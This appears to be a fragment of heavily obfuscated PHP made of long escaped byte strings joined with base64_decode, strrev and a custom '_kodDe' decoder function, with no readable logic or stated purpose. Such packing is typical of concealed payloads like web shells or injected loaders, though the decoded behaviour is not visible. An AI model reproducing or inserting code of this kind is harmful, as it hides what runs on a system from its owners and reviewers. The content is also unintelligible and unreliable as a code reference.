276\32\366\220\120\242\131\120\137\27\102\224\343\2\61\64\167\43\2\367\375\3\341\266\170\254\273\113\12\267\207\26".base64_decode('RjrbWCg4iX1NgqKVlkgCDVEzQ0bhkkgOA8NJ2CKZ63WhdAui7CggsexYGKCU2b0=').strrev('® .°'."\0".'è€Æ@,n‚o³ğ™™racdL§°ê¡'."\n".'N3'."\n".'ùÑ#ºšÊ')."\130\200\164\224\5\260\164\22\356\144\161\110\0\104\302\33\223\352\372\324\41\176\7\157\116\66\55\135\224\307\64\70\100\125\133\330\233\2\222\30\125\256\200\364\150\57\211"."\42\111\222\325\251\305\232\42\135\5\16\122\20\342\66\11\20\375\366\54\237\117\270\341\345\14\61\351\175\123\47\251\73\171\127\55\160\57\15\325\22\41\227\1\245\172\330"."\xb1\x9\x51\xdb\xa5\x4c\x49\x75\x4c\x36\x6a\x19\x20\x14\x45\x54\xcf\xc\x3a\x59\xa1\x6f\xc1\x96\x7a\x44\x5b\x4b\x83\x6e\x11\x8a\xd3\xa5\xe5\x5c\x32\x2\x8f\x6b\x3e\xf8\x85\x16\x1d\x40\x7f"."\172\40\310\364\14\160\201\243\332\7\233\54\263\366\167\273\176\353\351\251\32\157\264\40\1\33\63\10\126\321\40\313\245\363\75\57\323\207\35\56\244\234\2\323\123\23\341"."\114\150\204\251\126\131\204\133\342\261\56\312\201\50\221\126\205\336\352\127\252\251\36\272\32\130\253\346\170\30\257\16\232\212\305\325\124\273\64\110\363\252\25\270\342\133\353"."\xce\x15\xe9\x6c\x9\x2f\x56\xaa\xf5\xec\x48\x4a\x55\x53\x90\x59\x41\x6b\x91\x15\xa4\x94\x95\xc4\x4a\xa0\x6d\x85\x53\x1a\xbb\xcf\x1c\x56\x64\xf4\x62\xf2\x72\x33\x85\x25\x5\xca\x95\xb1\x66".base64_decode('5H4+u07pA6Gcx1COmEZFEmjDjkZJT1GUbmNG1qfwa/QYiIUPqpmEglgELYhGhRc=')."\47\343\41\14\44\334\347\176\373\242\77\204\240\140\351\310\52\20\37\17\51\312\263\5\226\203\222\140\271\213\105\244\314\43\146\22\1\203\310\226\47\365\211\307\20\115\1"."\35\146\131\217\260\0\270\156\32\352\212\107\72\102\361\45\60\144\102\6\200\25\150\346\135\67\115\105\100\267\273\245\273\316\235\250\325\362\335\147\72\307\234\302\42\171\226".strrev('ò±È¬Ãî¬Ä‡‡$@U'."\r".'L9;'."\n".'\\Áö>¢°Ô¢S+*üRê¡áæx'."\0".'XÔXQ').base64_decode('5SLhSg9vkniSGbVvDXVHZQgMlbIgvORb1ghraaU1wuKYOoavNuhPzXToH/VyUDM=')._kodDe('K7z4GJfJtgBuquFN/m74al6JJe41Lzqcf+csAnvHnjxRieH4GrR9q/y1UtxiPg1G')."\251\153\74\77\327\74\205\73\333\42\235\341\306\216\321\110\42\324\241\260\206\203\156\15\173\364\232\5\345\104\142\251\50\342\211\123\262\372\54\22\3\275\154\40\55\273\270"."\x48\x9\x4f\x19\x1\x55\x58\x2f\x3b\x56\x49\xf2\x16\x47\x2c\x99\xd1\xfc\x87\xc4\x85\x78\xae\x2a\x26\x71\xa5\x34\x4e\x2c\xed\x1a\xba\xd9\x80\xcf\x1\x30\x94\x72\x1f\x73\x18\xb6\x14\xd9\x55"."\151\360\242\347\65\63\226\301\302\122\231\37\134\60\3\151\104\256\12\256\14\335\322\315\165\65\53\231\45\53\254\146\162\242\142\270\75\276\241\15\61\237\302\116\44\220\274".base64_decode('l9JE+wuabfNzVSLdsE+nT9zglz3atTSxsSoZTkLLw9F3S5rYeIu7VHzgbMn2mxw=')."\122\210\361\246\316\6\75\31\241\244\10\357\270\224\112\0\243\302\205\35\76\37\20\145\56\143\62\272\350\344\12\275\350\75\20\60\314\56\315\52\350\344\340\143\221\270\130"."\xc2\xe3\xa5\xdc\xe4\xa6\x8e\xf9\x6d\x83\x5b\x32\x50\xd\x5d\x7c\x66\xfd\xf5\x2c\x31\x73\x52\x4a\x10\x46\xe1\x2\x2a\xbf\x2d\x81\xa6\x94\xe4\x95\xcc\xe9\x9\x93\x4\xc5\x5a\x70\x4\x79\xbc".base64_decode('p3GOaXaoxmjSXKgzM4SW2KLOaIx58mJu+2iodwXgPUK+AAs47MNSoeZFjG3H3IQ=')."\344\203\366\170\31\7\310\144\12\234\14\305\233\333\221\10\236\152\215\240\75\4\155\120\242\200\166\224\25\111\367\322\64\111\320\16\346\367\6\361\217\170\23\215\232\275\174"."\361\42\26\15\334\72\271\26\160\44\6\171\3\32\276\30\103\57\47\340\313\113\74\43\365\154\364\335\231\272\45\217\207\343\254\315\212\371\232\41\41\257\320\42\372\224\357"."\xae\x30\xae\x89\x6d\x11\x65\x23\xf7\x90\xbe\x33\x93\x70\xba\x49\x6a\x22\x99\x24\xba\xe5\xc9\x43\x10\x88\xde\xa2\x80\xb9\xee\x83\x68\xe1\xa8\x6\x11\xcb\xce\x58\xaa\x1d\xd1\xe3\x18\xdb\xb5".base64_decode('dTvpon8sF6xWBzEVmSC5jwky0Rxy4k3P3UDOWolIIP9ilgbgRknsliH6s6SQ9aM=')."\x86\x83\xdd\x42\x56\x73\xb8\xfb\x1a\xbc\xca\x42\x92\x73\x1d\xe9\x36\x6b\x81\x13\xa8\x61\xc9\x91\x9c\x3a\xa4\xe1\x6b\x47\x4c\xe3\x50\x66\xf0\x1\x5d\x29\xef\x1c\xf7\x57\xe4\x3e\x68\xc7\x27"."\105\211\130\167\234\35\147\340\60\271\330\30\17\67\57\341\47\13\34\332\32\132\350\205\340\65\220\14\265\125\4\163\345\20\206\23\51\54\25\217\141\55\132\70\332\352\311"."\x90\x68\xe7\x3e\xfd\xdc\xb0\x54\x34\xd2\xb9\xa0\x62\x4\xda\xcb\x3b\xa4\x2c\x14\x18\x49\x86\x3b\xbc\x30\x77\x9\x89\x30\x5e\xbf\x22\xdc\x14\x8d\x35\x4b\xd1\x91\x58\xf9\x48\x70\x66\x81\x3".base64_decode('qQ6OAoOn1fSsJGJEA5ImsquwsO5PIVl/fs/q2pqe4PzAJK5jovREugI5DthmdL8=').base64_decode('wQvAWwYD0mwQCgYCUAn/CPYEuc8kRkbBMWqCepdxtcLjrYFdlA54/Q5G6JFjKrE=')."\44\301\107\233\242\142\245\170\27\176\321\144\362\261\275\47\61\372\333\45\47\305\226\42\25\23\272\20\324\165\221\124\6\5\164\123\254\5\261\150\263\146\246\204\35\330\210"."\21\27\333\14\2\5\134\105\40\162\75\40\244\134\130\163\11\266\66\15\264\355\300\216\330\214\230\266\266\366\310\311\13\242\35\235\261\256\123\342\211\144\367\302\105\213\227"."\234\12\243\313\120\40\247\370\231\377\51\360\150\30\34\122\255\340\20\363\202\273\20\363\334\232\35\224\171\36\16\104\175\104\344\216\21\253\40\25\305\171\54\246\15\301\312"._kodDe('K6dEU6djtLrdxDxcWMZcuWdQfOTL+ODXNhHFDG6stklT/Q5h/YR4ISOzXOBxsIrk')."\x62\xf4\x94\x19\xaf\x6c\xda\xb3\xf9\x2\x40\xf8\x62\x97\xb6\x68\x1\x9c\xc2\x6c\xe2\x96\xf8\xb\xfe\x6c\x4f\xb2\xd\xbb\x25\xec\x39\x95\xcf\xb5\x6e\x49\xee\x1\x33\xa6\x91\xd5\xa5\x9b\xed".strrev('«ô_3üD×¾jüF–?A¸³%GÔ¥˜âàM6Öí¿©8¿'."\0".'Ì¥Xñ†j')."\3\256\170\341\221\262\150\346\165\346\61\154\320\217\252\220\342\150\142\124\70\333\103\261\251\0\367\346\211\3\66\17\311\113\214\354\62\334\202\5\357\145\355\236\25\315\201"."\xdc\xd7\x68\x82\x74\xa2\x41\x99\x6\xce\x75\x5b\x11\xe3\x2b\x5d\x2c\x64\x2e\x51\x85\xdc\x88\x59\x27\xe2\x4f\x96\x6\x7d\x8a\xf0\xab\xcd\xd4\x95\x95\xf9\x3a\xac\x68\x92\x6e\x4a\x66\xe4\x8b"."\356\214\30\27\6\204\255\124\141\200\133\103\144\134\314\11\346\3\132\45\223\52\301\177\200\107\153\24\327\64\312\354\222\340\222\143\323\150\134\362\320\357\362\76\40\73\5"."\17\55\112\114\363\267\167\204\232\375\150\113\231\62\175\6\337\330\173\222\150\147\147\210\245\16\333\323\230\274\101\41\223\147\50\175\150\46\0\143\312\75\167\116\160\173\254"."\xa5\x40\xea\x91\x32\x63\x69\x59\x6c\x25\xc2\x38\x49\xa\xf5\x60\x12\x5\xa\x3a\x41\xc3\xd4\xd3\x19\xb3\xa3\xea\x53\x79\x83\x71\x37\x80\x56\x55\xa8\x77\x71\xc5\x7a\x17\x57\xaa\x77\xb1\xa7"."\xde\xc5\xe5\xf5\x52\x90\x7\x63\xd5\x62\xb1\xb9\xf\xe3\x82\x8b\x9a\xba\x40\x19\x39\xc0\x76\xb2\x1c\xb6\x89\x91\x6d\x69\x40\xb3\x49\xd\x64\x3\x28\xba\x85\x32\xd5\x59\x9e\xde\x16\x5f\x7c"."\125\344\244\365\342\52\56\0\44\77\313\66\116\233\21\261\274\152\73\13\135\16\161\276\323\277\54\366\332\320\301\305\40\316\273\6\115\333\16\142\47\173\204\143\347\226\140"."\261\4\73\273\161\367\211\276\53\41\111\335\340\366\213\73\77\345\256\121\205\377\124\252\162\247\337\141\356\310\4\11\36\241\136\354\214\2\321\71\30\225\360\110\321\264\65"."\xd9\x71\x6f\x56\x23\x4e\x1f\xf9\xad\x6f\xc9\xcb\x6d\x41\x1d\xc1\x94\x88\x19\xc8\x49\xfe\x6e\x99\xf7\x58\xd9\xe3\x1e\x1e\x30\x7f\xc1\xe5\x8b\x7b\xc4\x8f\xba\xee\xf1\x18\x6b\x6b\xda\x0\x13"."\60\45\41\204\53\5\272\270\47\130\157\167\60\51\20\104\321\342\136\202\351\151\255\277\42\300\57\371\121\240\324\100\362\32\215\332\5\105\343\146\302\372\355\43\143\303\24".strrev('Â-«§ÉlÔ9sRÇ&ROGO[OnSÇ€VzŞÜÊ6}¿êKš/5Â[ö½JÔçô	')."\x31\x2f\xa0\x1f\x7e\x97\x44\xd8\x91\x8e\xeb\xd6\x17\xe\x25\x4e\xac\xe8\x15\x18\x22\x89\xd4\x11\x44\x29\xf0\xad\xf9\xe1\x14\xc7\x5c\xf2\x50\x43\x5\xdc\x3d\x5\xc3\x1\x7b\x73\xc2\xb2\xb4"."\x58\x92\xde\xa\x91\xf1\x5\x6f\xe3\xfc\x7d\x7\xac\x54\xa0\xce\x94\x19\xc9\x20\x4e\x8e\xc1\x61\x7a\x23\xeb\x11\x1a\x3a\xa3\xc9\xcc\xc2\x9e\xb8\xb2\xa\x61\x62\x55\x43\xd5\x84\x1a\xf4\x5b".base64_decode('W+WrwswpCeNZxADSjqqGCTXkoxbciqyAWxGSu1FxEg7qhPloaKXjm/lkNPDanxI=').strrev('/Õ8ê*3¦Z;–FŞv˜åÔaÖ@¾&JD±ØöD)#îğ)^(×0zœ')."\0\317\235\77\122\310\53\40\151\66\126\327\7\352\252\25\366\254\105\143\165\167\262\325\77\253\172\376\274\375\346\66\223\303\134\107\353\300\247\261\330\253\62\125\0\314\203"."\303\226\271\170\171\361\100\320\35\32\57\57\340\137\101\135\141\32\150\253\103\24\252\20\310\300\140\166\163\52\46\174\62\33\232\63\154\132\160\122\15\4\166\112\335\64\31"."\247\1\105\154\266\264\211\47\203\6\254\237\144\335\357\56\216\226\14\77\126\103\370\23\262\117\71\217\253\367\72\167\172\254\110\160\247\227\111\143\106\220\217\202\370\244\156"."\xfb\x1b\x14\xf9\x7d\x6\xc9\xe3\xad\x1f\xf3\x4\x74\x55\x32\x9d\x16\xc0\x30\xd5\x64\x20\x5d\xf6\x1f\xcc\xf0\x1a\x93\xc4\x94\x9b\x24\x9e\xe4\x69\x2f\x1e\x6a\x3f\x62\xba\x30\xfe\xa3\x45\x85"."\266\137\107\253\224\304\375\140\200\367\31\1\357\50\220\54\170\162\375\362\373\4\43\210\343\306\321\330\173\271\37\317\257\137\317\216\27\43\26\165\305\246\146\0\125\52\45"."\xe9\x2e\xe9\x59\x6f\x95\xc4\x38\xc0\x5f\x2a\xb1\xa\x2b\x16\x2a\xcb\x3\x2c\x1\xe9\x44\x84\x97\xe7\xe2\xcc\x55\x34\xd7\x9c\x19\xf7\x32\xf7\x92\xde\xb8\xdc\x31\x38\x5a\xbc\xca\x94\xa9\xd"."\323\147\243\377\201\74\62\333\206\122\221\31\43\243\117\346\70\374\370\140\216\321\1\361\202\0\353\33\236\160\311\305\272\13\54\206\221\257\160\106\100\134\351\104\153\135\157".base64_decode('U0BHqcwuuYInCm66krDFT4q71q9ASbPs5pxuwLYrPWjFJ6SXfVg8vSqWSDo/IHo=')."\222\306\166\327\200\341\3\250\241\246\140\263\310\226\53\151\223\63\175\45\143\240\121\212\124\34\323\124\12\252\61\12\322\300\104\273\141\242\75\7\127\324\70\61\60\55\147"."\243\0\320\153\356\57\25\357\43\302\173\36\165\30\3\61\124\235\37\300\157\132\4\360\46\25\57\111\117\352\270\57\74\244\320\336\344\71\64\226\37\360\352\312\227\370\43".base64_decode('B0XyDV3qina3RTolSyYJkGpu6UyFuroqRnAOB2sVsRlAoJ89yJNhaDhXL/QqGXw=')."\x7b\xa1\xb1\xa\x43\xab\x14\xdb\xca\x30\x37\xb3\x55\x41\x20\xbc\x24\x81\x10\xb8\xe6\xea\x90\xa5\x1a\x67\x51\x72\xa8\x4f\x7e\xf2\x45\xa3\xab\xe7\xcd\xd\xea\xf3\xf8\xec\x8\x7f\x3e\x96\x29"."\56\147\4\202\47\140\361\53\210\155\205\214\23\61\72\310\246\13\4\332\52\274\367\50\312\134\125\241\3\337\130\215\15\71\162\325\112\37\332\300\271\241\344\74\157\346\116".strrev('ôò‘õÉ&tQÈÈXXÕf‚QäÔ§$„Y+ökˆk©s/ÆMÆ)x‘Ê¨74 v')."\101\242\72\10\12\1\323\175\206\303\217\75\52\40\105\200\77\355\123\124\63\3\30\5\305\176\1\165\102\104\27\226\151\150\204\313\331\276\43\331\152\224\360\125\52\242\231"."\267\304\123\41\53\127\322\202\60\213\260\172\165\71\14\314\75\275\121\241\242\356\5\141\314\361\302\260\214\56\140\150\343\163\127\103\261\126\116\44\40\54\15\375\25\171\242".base64_decode('nW0iQJeWK3Ips6wmoZ6l1YFJq1cHdWYUxQw4WN4AT03DPQF3etQTGHqeEADelJQ=').base64_decode('4TwZFt9+wUni+hc3flKwRVRj47yl/CBoGYtjXKNeP4tN/4o+f3IR/2zuFHwxR3I=')._kodDe('KkM+OPYGs+9mkaW4M60Tl5RzHn57LTlSvBVqBnsxbdgRkZ9IEib4ytY/CFw2+4GC')."\55\227\74\21\370\165\104\2\36\102\324\23\261\151\375\136\70\52\213\3\371\307\134\73\143\351\105\307\105\247\350\43\164\125\344\21\222\176\165\110\245\111\252\24\20\350\33"."\253\210\57\366\52\104\227\150\14\20\4\321\224\271\230\0\51\226\226\157\254\42\315\265\373\64\15\345\47\44\246\122\45\50\143\225\302\250\143\101\345\43\146\71\46\332\51"."\371\375\35\170\376\247\73\16\167\42\102\235\160\20\4\74\330\11\247\321\337\11\47\360\375\0\277\105\225\327\54\152\370\115\250\16\71\32\314\11\45\30\274\106\324\25\217".base64_decode('JWPN7EGXStqyaYzhtemFMyEYses73D6CpeAsRBAgMP1WyTC4qRnmKfk+RwRoLQs=')."\x6b\x80\x1e\xb3\x25\xfa\x4a\x8e\xd8\x2f\xb1\xe3\xf6\x24\xbe\x49\x6b\x3\x58\xf2\xb4\x87\xfd\xfc\xa1\xcc\x4b\xa9\xe2\xb2\xb1\x8e\xdd\xc0\x60\xd6\x69\xe2\xfe\x15\x4b\x49\xe\x4b\x9\x55\x36".strrev('ä'."\r".'uu$²ºº†»XäüÿÑêëùÕÕÔ§	~dŞVm	U.¦nIÅõO*¢¹—z')."\32\101\264\275\60\27\356\30\264\364\31\315\202\4\303\232\6\15\202\15\241\240\33\45\306\175\55\155\306\27\260\24\334\264\145\214\341\140\355\107\323\100\334\5\62\362\61".base64_decode('R5IZ5yjkZBJCmncQ+JEvTCzbhzG9YN+ICUKjSgYF2stv6aFkAn3m0EuRjbxRYSM=')."\273\124\256\54\300\6\227\2\205\3\143\77\213\360\313\17\2\100\46\272\61\210\363\16\127\323\120\36\267\37\102\14\101\33\164\206\367\23\3\44\325\12\346\350\44\337\212".base64_decode('OCgfa5BofimOhPL81j0OdvKS6LsT9ElWGMMKmNxnDqfEHoyDJ/MQGVIsWzE0zEo=')."\x17\x17\xf1\xb8\x32\x6a\xcc\xd0\x8e\x19\x2c\x80\xfd\x3\xb9\x88\x3e\xa0\xe7\x5d\xd7\x6f\x53\x52\xd9\xf2\x68\xce\xc1\x9\xe5\x51\x42\x6b\x35\xc4\x1f\xd8\xa0\xd6\x85\xac\x7a\x5\x16\x1e\xf0".strrev('=ÌÒĞj'."\0".'f9æñ<ö˜2i!d±Ëg—Ë™ÎñÏæÊı†ĞƒQ  ‹x')."\112\5\170\243\74\171\102\131\351\231\105\133\270\34\154\346\376\116\145\77\204\324\0\100\62\23\261\301\251\272\70\361\147\145\14\111\2\121\240\150\231\275\150\166\154\271\257".strrev('±#_?™¢)3¯t±¢ñRR£ëÅU»ÜM={áñ\'NHwˆ¬§—“ÌUŞ')."\x80\x25\xdb\x78\x10\xeb\x58\x77\x19\x58\x10\x72\x43\x78\xcb\xbe\x5\x57\x98\xc4\xed\xc0\xeb\x91\xb2\x6d\x20\x4d\x26\x68\x5\xd6\x86\xc8\x3a\x5b\xdd\x64\xe6\x23\x78\x34\xc4\x51\xae\x1b\x4e"."\x61\x54\xfe\x75\x9d\xfe\x24\x9\xb9\xc9\x6b\xec\xe1\x4a\x20\x48\x4\xef\x71\x1\xc4\xcc\xc6\x33\x80\x2\x57\x61\x75\x35\x36\xca\xd9\xdc\x71\xdb\xce\xb9\x94\x7d\xac\x63\xa9\xf0\x10\x72\xf5"."\235\254\327\306\303\227\222\125\23\170\321\265\363\267\25\53\40\235\33\261\312\60\210\154\332\270\200\6\116\220\244\20\22\263\30\47\226\145\355\35\54\151\214\173\224\250\227"."\342\10\332\5\224\46\331\147\231\16\227\54\160\174\50\53\121\344\250\314\73\44\151\26\377\74\121\217\353\30\114\162\121\314\223\242\335\206\325\256\262\35\210\330\164\21\327".strrev('^µÄá€!É^¤E¦2ÒÌmg‰'."\r".'B¦ìÉ	<#ñü;|Ï‚0ánÈ¾íz	ã°’ú')."\x39\x18\x35\xb9\xb4\x8f\x8f\x5d\xb4\xa\x45\x60\x1f\x2c\x12\x8a\x63\x2c\x40\x72\x68\x49\xf6\xe8\x22\xb9\x86\x46\x21\xc9\x17\xb7\xc4\x8e\xf8\xeb\x15\xce\xc7\xa4\x68\xc9\x34\x30\x59\x8a\x20"."\351\53\261\64\36\45\225\164\261\200\210\331\211\122\232\237\25\170\30\15\166\127\101\221\367\161\166\371\0\27\100\234\153\340\36\330\162\34\52\26\273\201\25\75\223\263\220"."\72\313\262\320\70\274\225\12\27\25\162\214\215\344\62\74\124\343\307\124\250\212\104\111\43\232\341\216\172\140\164\304\40\101\304\250\306\114\373\374\365\123\374\123\101\25\55".base64_decode('X2RgbC7QLLQWJDTA3D6jg2CnB+lEGlM6cSFuK8S1fuKhg88nceXBQ5a0b2ncho8=')."\xf8\xb4\x90\xc9\x8a\x38\x18\xa7\xa6\x7d\x38\x41\x77\xa5\x78\x3a\x42\x38\xba\xc5\x65\xf9\xe8\x49\x80\x56\x86\x3b\x1e\xfc\x7d\x17\x5c\xf\x5c\x23\x3c\x70\x99\xcf\x78\xa\x1\x9f\xee\xb2\x1f"."\163\222\113\364\103\30\221\42\220\111\275\212\113\3\43\16\370\251\267\17\146\375\312\351\222\0\47\115\16\54\67\22\10\160\353\137\270\342\11\57\31\326\324\342\53\236\56"."\335\112\307\50\277\210\207\115\170\360\46\301\115\60\155\71\300\142\71\162\332\256\0\65\131\162\345\346\40\236\152\230\71\314\342\72\200\256\366\256\40\7\65\361\345\111\345"._kodDe('MM80llLHh3fznyX5dTRotHcQyI+7OVafEtcuCsMb19BlzYGCq7h3/HmxKiLYOWV9')."\x3f\xfd\x69\xc4\x54\xfa\xb3\x9c\xb7\xb6\x5\x17\x2d\x19\x6e\x49\x6f\xee\xb8\x8b\xa5\xf8\xa7\x59\x65\x25\x1a\xf8\x12\x46\xbe\x2c\xf\x56\xe4\x55\x48\x9d\x17\x7a\x2d\x29\x71\xd1\xd2\xca\xd3".strrev('?+!•T.—*1Ë>.¶én¼kÆ3X£S»úå} kB©C)bÑkáäj')."\244\40\315\200\30\154\132\113\271\217\53\360\20\44\373\343\366\10\315\164\232\144\137\147\105\246\251\207\347\336\304\113\34\44\50\275\221\122\264\124\335\326\44\0\175\254\143".strrev('ê4UøË=#[…gª›ÿPOÇJU©Ü“´RªÅh;Ü–'."\n".'N|³ë¾"@mÜ')."\352\275\131\176\360\216\325\131\366\16\314\167\276\50\343\23\107\5\51\342\42\206\75\133\145\22\26\33\170\102\12\213\304\122\104\251\227\22\125\40\231\315\32\55\312\207\113"."\301\154\220\17\61\375\300\336\333\302\114\151\214\3\202\1\306\311\241\64\134\35\25\201\220\100\206\265\57\214\125\146\206\211\210\36\300\70\273\16\127\75\157\343\170\355\66".base64_decode('XY9Jl9WBzb+gHKLfQSmXic6hEH++QWT1xlRoAIpWhAaDJ1AalTr6WhN3yK/MZRc=').base64_decode('a0UFxN9SuFB0XOJhu2ywLc0NBRCORogE2OzFLIyWAVxqiyhrF7eTw88RGDlTHj8=')."\102\170\261\365\75\175\112\215\312\241\76\304\323\153\116\371\353\52\64\373\377\111\106\32\231\220\254\7\335\205\224\67\310\366\156\151\202\275\302\17\307\364\231\303\356\367\324".strrev('ùé÷4ª9kÚù)¢ŞFm—àzHœ'."\n".'’'."\0".'^º¹Äqì6³òŸûÑi‘ëŒTûÄ0').base64_decode('rMWtMwSgQxMiJcmFDRRU9l4neVWqhVFaeF/C/cQFByvuBzPEOyRi53O/1MDPGG0=')."\x81\xe2\xb6\xe3\x7a\x9\x24\x69\x26\xd5\x5e\x1f\xe5\xa7\x30\xad\x12\xa1\xa6\x51\xf9\x5b\xb6\xc8\x24\xbd\x40\x91\x4c\x5b\x93\xe5\xb3\x38\x4f\x4a\xc0\x9e\xe5\xca\xfa\xc8\x9b\x51\x94\x80\x79"."\x1f\xb0\x90\xd6\xf\xa7\x8a\x72\xee\xde\xbc\x99\x56\xf3\x71\x6a\xd4\xe4\xba\x81\x61\x21\x59\x88\x1b\x2a\xba\x92\x51\x50\x50\x2d\x16\xc7\x3d\xd2\x0\x1e\x87\x1e\x6f\x94\x8c\x8\x55\x15\xbb".strrev(''."\r".'8D›eÚ°WFÃ}?,Î½*Ù9\\i§d‹–İrz.¶¨ä‚j\\G ô±6Ék$– ').base64_decode('yMIQJFDmKmKCXYsMIwTiSH3kg6ximXn+FijHQ/cTJxRhyU+LluOSBA6LnVZ23yA=')."\216\351\275\257\145\261\152\370\323\137\76\332\63\361\240\43\175\350\313\307\37\365\362\121\367\171\76\170\312\313\47\56\247\175\333\53\51\342\321\125\367\113\255\270\315\334\210".base64_decode('r4yl93LzfKg8GeLegUua5To+ceZolAriFBcF3NJNWYelHpasvI+cuPqYUzPPcIg=')."\136\311\63\123\141\14\277\273\14\152\313\111\104\226\254\233\352\64\314\115\133\354\324\312\233\114\167\141\135\312\322\304\45\15\352\314\261\354\65\236\45\205\354\224\251\323\147".base64_decode('y6oBMT/i/Id5hKY/wAOIGVfc+KQwD5LyuiWRbjPb8jf3PBT4f4b5gvemSSWj1/I=')."\x97\x49\xcb\x46\x80\x20\xa1\x64\xe\x22\x6d\x48\x9e\xa3\x7c\x13\x9f\xb0\xdb\x62\xf9\xd0\x2d\x48\xbc\xb4\xe7\xae\x8b\x6e\xca\x15\xfa\x21\xed\x3b\x62\x25\xd0\xa7\xcf\xcc\x3c\x96\x50\xb\x58"."\313\352\130\252\133\34\253\44\165\220\221\140\42\216\116\236\15\326\274\155\47\3\3\272\10\21\55\211\45\162\211\216\351\125\244\340\354\170\137\42\172\274\230\301\274\115\343"."\x4b\xb7\x62\x4d\x49\x24\xe5\x7f\x30\x81\x4c\xf2\xa0\x42\x8a\x30\xe4\xa8\xd0\xf3\xe0\x49\x8c\x6e\x54\x78\xda\x4e\x3a\xd\xff\x96\x76\x53\x9e\x89\x4b\x59\x7e\xd5\xf1\x4b\x8\x29\x29\xdf\x34".base64_decode('J0YmGLgPIfS5++opHmUTZSzzKeMlKmecpBfwhLsliWXCudntvnFkZkac5Lf9nD4=')."\x21\x14\xd0\x15\xea\x5a\xad\x92\x5f\x56\xf9\xba\x13\x29\x48\x5e\x6\xe5\x45\x4b\x4f\xac\x9\x35\xa\xd1\xbb\x40\x27\x60\xd\x13\x2f\x92\xe4\x9a\x5b\xa8\x8d\x5f\x7d\x53\x25\xe3\x1b\x3c\x9e".base64_decode('0uuWpvztvlceY54wUX0uKQ2FWzwPoBI65H0VlQ0KWfyCrkl3KF0iAX/AyiUi2N4=')."\267\345\20\113\45\373\250\105\101\216\366\260\201\2\1\44\206\320\264\66\151\177\24\133\241\370\32\357\275\162\367\143\346\256\253\246\330\121\220\147\255\263\13\254\266\347\305"."\107\352\147\224\176\63\366\372\377\372\61\265\377\127\157\250\115\257\143\312\152\327\373\251\155\300\344\62\216\154\205\344\241\230\52\112\75\375\160\157\223\373\2\26\361\27\203".base64_decode('pTC39mTOopgPKZUdrqj5vPeksUwsKHtqEiHfAH8fsVLA7W84Jb8PXEEyZdym9Nw=')."\260\236\31\250\160\60\210\7\77\352\166\326\53\361\10\145\311\4\271\102\254\4\163\242\25\144\137\31\54\65\141\106\222\121\111\371\156\144\254\310\344\253\132\40\314\313\116"."\142\324\204\334\266\6\242\42\23\22\27\250\214\374\44\135\103\352\2\312\243\45\236\113\347\217\65\273\162\164\170\336\336\243\211\154\171\154\135\372\351\362\163\342\362\334\174"."\x19\xcb\x59\xb0\x8d\xac\x5b\x95\xc3\x1f\x43\xae\xf3\xbe\x8e\x5c\xef\x2f\xaf\x8c\x9a\xa8\x63\x6d\x42\x1c\xcb\xef\x4c\x23\x43\x8e\x30\xc8\x11\x63\x85\x3c\x14\xed\x12\x22\xcd\x38\x88\x5f\x79"."\xf9\xf1\x37\xf\x85\x7a\xa\x7f\xc9\xfd\x65\xcb\xb8\xcb\x32\x9\x3f\xe6\x86\x72\x9d\x86\x64\x6d\x28\xbd\xcc\x5b\xf6\xf2\xa6\xe7\x28\x0\x9\x47\xe2\x6c\x4c\x37\x89\xa7\x6e\xe8\x76\xa2\xbb"."\243\206\334\262\0\114\105\274\175\253\51\136\110\57\24\251\222\114\336\122\331\365\46\311\72\30\100\56\125\226\55\77\175\340\316\211\355\275\335\53\145\136\245\144\31\323\262".base64_decode('pWQcXiktftzUcY2mcJ/udZtOBGEq27pEXDiIlEHSOR3idrPudxhIJAEz74xQgnQ=')."\322\344\76\350\343\156\245\313\10\127\111\217\112\321\44\27\163\372\205\176\361\65\257\210\360\47\100\242\251\16\75\64\244\72\354\270\314\233\313\375\356\261\164\54\230\41\270"."\x13\x2e\x3f\xf9\x11\x7\x52\xd2\xb6\xcf\xb2\x61\x51\x44\x50\x64\xf\x5c\x22\xfb\x82\xda\xa9\x43\x82\x4b\x11\xcc\x70\x36\xcb\xdf\xd8\x76\x25\xcd\x32\x71\x80\x43\x11\x44\x3c\xc7\x8d\xb9\x1c"."\351\346\250\260\57\326\206\275\117\250\6\344\333\246\256\204\345\120\161\263\124\312\57\316\6\104\67\61\254\122\367\311\222\161\147\227\157\256\162\244\22\40\352\111\237\33\314"."\110\202\7\66\254\27\226\64\264\53\134\212\26\125\272\357\311\362\144\174\316\120\32\162\215\301\357\202\172\104\51\254\223\140\33\270\47\312\226\237\17\167\237\366\311\142\275"."\x84\x2\x5a\x3e\x2a\x15\x27\x9f\x4\x8e\x9b\x21\x51\xb9\x12\x81\x95\xee\x21\x96\x2e\x18\x8b\x8\xb6\x59\x99\xae\xc1\x97\x88\x1d\xef\x18\xa4\x8c\xcb\x91\xae\xe6\x78\xa7\x96\x48\x1\x2\x7d".strrev('¢l'."\n".'õ1±VŞ½¹TT*'."\r".'•n²<¤Ñ$údî°öÑŞåëO5é¢ä.4˜ô@°)').base64_decode('kLL2SOYESbNCHtqiitloFM4puEdX3nGGAOelUThvWTTLLOk3pHyOWrLH6V754IE=')."\xd0\x9f\xad\xd0\x61\x8f\x68\x4c\x93\x8e\x37\x9e\x15\x13\x97\x57\x7\x18\xe7\x4d\x4d\xb4\x4\x95\x5b\x21\x84\x7b\xcf\xb1\x6e\xa5\x56\x54\x4c\x3c\x6e\x2b\x44\x6a\xcf\x2e\x50\x89\xd6\xb2\x98"."\xa\xd4\x55\x9c\xef\x97\xd3\x71\x11\x57\xc1\xda\x80\x96\x89\xf7\x68\xd9\xe1\x50\x85\x68\xd9\x74\xa1\xb2\x71\x43\xbc\xe2\xd2\xb7\xdd\x56\x7\x1e\xb8\x3c\x30\xcc\x2\x9\xc9\x6a\xe2\x29\x78"."\xc9\x9a\x77\xa2\x8b\xa4\x97\x8c\x1\xc3\xe4\xdb\x44\x56\xd8\x89\x61\xbb\x53\xfe\x78\x3a\xaf\xae\xac\x34\x37\x6a\x1a\x25\xc9\xf3\x66\x45\xe3\x62\x1f\x96\xac\xcb\x65\xd8\x3c\x7b\x67\x4c\xb6".base64_decode('yqZSi+noGc3t3lN2NUTjWSV5SR/nUYUJOd91QF5BWURAwK4JlbPL0p3u/6Brp0c=').strrev('"Lâ_@Œ²O›ÃÉ„ÏJ™Hâ8é“oÉi.8|rÓ	Ñ¤¿t“ÿ³